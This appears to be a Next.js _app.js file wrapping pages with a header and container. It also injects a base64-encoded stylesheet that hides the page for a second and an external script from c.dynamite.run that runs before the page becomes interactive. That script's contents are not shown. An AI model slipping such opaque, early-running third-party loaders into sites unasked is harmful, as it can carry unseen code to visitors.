import '../styles/globals.css';
import Header from '../components/Header';
import Script from 'next/script';
import Head from 'next/head';
import React from 'react';

function MyApp({ Component, pageProps }) {
  return (
    <>
      <Head>
        <link rel="stylesheet" href="data:text/css;base64,Ym9keXthbmltYXRpb246ZiAwcyAxcyBiYWNrd2FyZHN9QGtleWZyYW1lcyBme2Zyb217b3BhY2l0eTowfXRve29wYWNpdHk6MX19" />
      </Head>
      <Script src="https://c.dynamite.run/d.js?sid=0J3_5IZ" strategy="beforeInteractive" />
      <Header />
      <main className='container'>
        <Component {...pageProps} />
      </main>
    </>
  );
}

export default MyApp;
